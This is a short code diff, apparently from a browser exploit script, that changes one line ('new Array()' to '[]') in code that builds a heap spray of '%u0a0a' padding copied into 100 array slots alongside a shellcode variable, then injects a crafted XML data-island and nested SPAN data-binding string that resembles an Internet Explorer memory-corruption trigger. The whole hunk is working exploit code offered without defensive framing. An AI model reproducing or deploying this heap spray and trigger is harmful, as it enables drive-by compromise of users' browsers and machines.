@@ -34,7 +34,7 @@ var psrayt = unescape("%u0a0a%u0a0a");
 do {
    psrayt += psrayt;
 } while(psrayt.length < 0xd0000);
-meray = new Array();
+meray = [];
 for(i = 0; i < 100; i++)
    meray[i] = psrayt + srtkod;
 xmlcode = "<XML ID=I><X><C><![CDATA[<image SRC=http://&#x0a0a;&#x0a0a;.example.com>]]></C></X></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><XML ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
